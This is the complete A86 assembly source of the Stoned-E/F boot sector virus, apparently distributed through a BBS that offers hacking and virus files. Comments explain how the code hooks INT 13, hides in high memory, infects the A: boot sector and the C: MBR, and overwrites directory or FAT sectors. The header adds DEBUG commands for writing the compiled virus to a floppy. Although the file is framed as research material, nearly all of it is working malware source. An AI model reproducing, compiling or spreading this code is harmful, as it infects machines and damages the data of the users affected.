

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
;********************************************************
; Source code of the Stoned-E/F Virus - Made by XSTC
; Made in A86 v3.07
;
; The Stoned virus is a bootsector virus. When you boot
; with an infected disk, it installs itself in high
; memory, decreasing the memory size by 2 KB. It checks
; if the C: drive is already infected, and if not,
; infects it. It hooks int 13, and if a read or write
; operation is made to the A: drive, it infects it if
; the drivemotor is off (so at the start of a
; read/write sequence). At the A-drive it overwrites
; sector 11 (a root-dir sector) and at the C-drive
; sector 7 (a fat-sector).
;
; One out of 16 times (if the timer tick mod 16 = 0)
; the virus displays:
;
; (Stoned-E): Your PC is now Stoned!
;
; (Stoned-F): Twoi PC jest teraz be!
;
; You can switch between Stoned-E and Stoned-F by
; moving the ; before the messages at the end.
;
; Each time you compile the virus, enter the new size
; in TotalSize (below) and compile again.
;
; Now that you have STONED.BIN, place a disk to infect
; in drive A and type:
;
; > DEBUG STONED.BIN
; - L300 0 0 1            (Read original bootsector)
; - W300 0 0 B            (Save at sector 11)
; - W100 0 0 1            (Place virus)
; - Q
;
; For the criminal reader: If you want to make a virus,
; don't you think there are enough destroying viruses?
;
; This code is only made to show the possibilities and
; dangers of a virus. It is only intended for research
; purposes - spreading a virus is prohibited by law.
;
; NOTE - The MOV DI,SI code is compiled different by A86
; than in the original virus (See line 184).
;********************************************************

Stoned segment
org 0
assume cs:Stoned, ds:Stoned, es:Stoned

TotalSize       equ 1BEh

                db 0EAh                ; Jmp 7C0:Jmp_Init (To make ofs. virus 0)
                dw offset Jmp_Init
                dw 7C0h

Jmp_Init:       jmp Init_Virus

Infect_Drive    db 0                    ; 0 = Booted from A:, 2 = Booted from C:

Orig_13_Addr    dw 2 dup (?)                                 ; Orig Int 13 addr.

MemEnd_JmpAddr  dw offset End_Mem_Jmp           ; Jump to virus at end of memory
End_Mem_Seg     dw (?)
Orig_Boot_Jmp   dw 7C00h, 0                              ; Jump to orig. bootsec

New_I13:        push ds
                push ax

                cmp ah,2                               ; Reset disk / Get error?
                jb No_Inf_Try                                        ; Yes, quit
                cmp ah,04                                        ; Read / Write?
                jnb No_Inf_Try                                        ; No, quit
                or dl,dl                                              ; Drive A?
                jnz No_Inf_Try                                        ; No, quit

                xor ax,ax
                mov ds,ax
                mov al,[43Fh]            ; Drive motor busy? (Only try to infect
                test al,01                  ; at the start of a Rd/Wrt sequence)
                jnz No_Inf_Try                                       ; Yes, quit

                call Try_Infect

No_Inf_Try:     pop ax
                pop ds
                jmp far [cs:Orig_13_Addr]

Try_Infect:     push bx                                              ; Save regs
                push cx
                push dx
                push es
                push si
                push di

                mov si,4                                          ; 4 read tries

Read_Sec:       mov ax,201h                                      ; Read 1 sector
                push cs
                pop es
                mov bx,200h                 ; Behind the virus, in end-of-memory
                xor cx,cx                                      ; Cyl. 0 sector 0
                mov dx,cx                                      ; Side 0 drive A:
                inc cx                                             ; -> Sector 1
                pushf
                call far [cs:Orig_13_Addr]                           ; Do Int 13
                jnb Check_Inf

                xor ax,ax                                   ; Error, reset drive
                pushf
                call far [cs:Orig_13_Addr]                              ; Int 13
                dec si
                jnz Read_Sec                            ; Loop to Read (4 times)
                jmp short Quit_Infect                       ; Still error - quit
                nop

Check_Inf:      xor si,si                                      ; Start ofs virus
                mov di,200h                                   ; Start ofs sector
                cld
                push cs
                pop ds
                lodsw
                cmp ax,[di]                                              ; Same?
                jnz Not_Yet_Inf                                     ; No, infect
                lodsw
                cmp ax,[di+02]                                     ; Still same?
                jz Quit_Infect                                       ; Yes, quit

Not_Yet_Inf:    mov ax,301h                                     ; Write 1 sector
                mov bx,200h                                  ; Ofs orig. bootsec
                mov cl,3                          ; Sector 3 (CH=Cyl.=already 0)
                mov dh,1                          ; Side 1 (DL=Drive=already A:)
                pushf
                call far [cs:Orig_13_Addr]                              ; Int 13
                jb Quit_Infect                                   ; Error -> Quit

                mov ax,301h                                     ; Write 1 sector
                xor bx,bx                                           ; Ofs. virus
                mov cl,01                          ; Sector 1, CH=Cyl.=already 0
                xor dx,dx                          ; Side 0, DL=Drive=already A:
                pushf
                call far [cs:Orig_13_Addr]                              ; Int 13

Quit_Infect:    pop di                                            ; Restore regs
                pop si
                pop es
                pop dx
                pop cx
                pop bx
                ret

Init_Virus:     xor ax,ax
                mov ds,ax

                cli                                      ; Stack on a safe place
                mov ss,ax
                mov sp,7C00h
                sti

                mov ax,[4Ch]                                     ; Save I13 addr
                mov [Orig_13_Addr+7C00h],ax
                mov ax,[4Eh]
                mov [Orig_13_Addr+7C02h],ax

                mov ax,word ptr [413h]                         ; Get mem KB size
                dec ax
                dec ax
                mov word ptr [413h],ax                               ; 2 KB less
                mov cl,06
                shl ax,cl
                mov es,ax                                      ; Seg of last 2 K
                mov [End_Mem_Seg+7C00h],ax

                mov ax,offset New_I13                          ; Install new I13
                mov [4Ch],ax
                mov [4Eh],es

                mov cx,offset End_Virus
                push cs
                pop ds
                xor si,si
                mov di,si                    ; For 100% orig. virus: db 8Bh,0FEh
                cld                          ; (A86 compiles MOV DI,SI to 89 F7)
                repz movsb                         ; Copy virus to end-of-memory
                jmp far [cs:MemEnd_JmpAddr]        ; Jump to last 2K (next line)

End_Mem_Jmp:    mov ax,0                                           ; Reset drive
                int 13h

                xor ax,ax                                   ; ES to begin-of-mem
                mov es,ax

                mov ax,201h                                      ; Read 1 sector
                mov bx,7C00h                         ; At ofs 7C00 (Bootsec-ofs)

                cmp byte ptr cs:[Infect_Drive],0              ; Started f. A:?
                jz Started_A

                mov cx,7                                ; No, C: - Cyl. 0, Sec 7
                mov dx,80h                                    ; Side 0, Drive C:
                int 13h
                jmp short Dont_Inf_C
                nop

Started_A:      mov cx,3                                   ; Yes - Cyl. 0, Sec 3
                mov dx,100h                                   ; Side 1, Drive A:
                int 13h
                jb Dont_Inf_C

                test byte ptr [es:46Ch],7               ; Timer tick mod 16 = 0?
                jnz No_Message

                mov si,offset Message                    ; Yes - display message
                push cs
                pop ds
Show_Message:   lodsb
                or al,al
                jz No_Message
                mov ah,0Eh
                mov bh,0
                int 10h
                jmp short Show_Message

No_Message:     push cs
                pop es
                mov ax,201h                             ; Read boot sector of C:
                mov bx,200h
                mov cl,1
                mov dx,80h
                int 13h
                jb Dont_Inf_C              ; Error (drive doesn't exist) -> quit

                push cs                      ; Check bootsector already infected
                pop ds
                mov si,200h
                mov di,0
                lodsw
                cmp ax,[di]
                jnz Infect_C                                      ; No -> infect
                lodsw
                cmp ax,[di+02]
                jnz Infect_C                                      ; No -> infect

Dont_Inf_C:     mov byte ptr cs:[Infect_Drive],0                     ; A: infect
                jmp far [cs:Orig_Boot_Jmp]                    ; Start orig. boot

Infect_C:       mov byte ptr cs:[Infect_Drive],2                     ; C: infect

                mov ax,301h                                     ; Write 1 sector
                mov bx,200h                              ; Ofs. orig. sec in mem
                mov cx,7                                       ; Cyl. 0 Sector 7
                mov dx,80h                                     ; Side 0 drive C:
                int 13h
                jb Dont_Inf_C                                    ; Error -> quit

                push cs
                pop ds
                push cs
                pop es
                mov si,offset Last_Line+200h                    ; Copy signature
                mov di,offset Last_Line
                mov cx,(400h-TotalSize)               ; 400h bytes for 1024-secs
                repz movsb
                mov ax,301h                                     ; Write 1 sector
                xor bx,bx                                         ; Offset virus
                inc cl                                     ; Sector 1 (All other
                int 13h                                       ; regs already ok)
                jmp short Dont_Inf_C

Message         db 7,'Your PC is now Stoned!',7,0Dh,0Ah,0Ah,0        ; Stoned-E
;Message         db 7,'Twoj PC jest teraz be!',7,0Dh,0Ah,0Ah,0        ; Stoned-F

Other_Mesg      db 'LEGALISE MARIJUANA!'             ; This one is not displayed

End_Virus       db 6 dup (?)

Last_Line:

Stoned Ends
End Jmp_Init

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

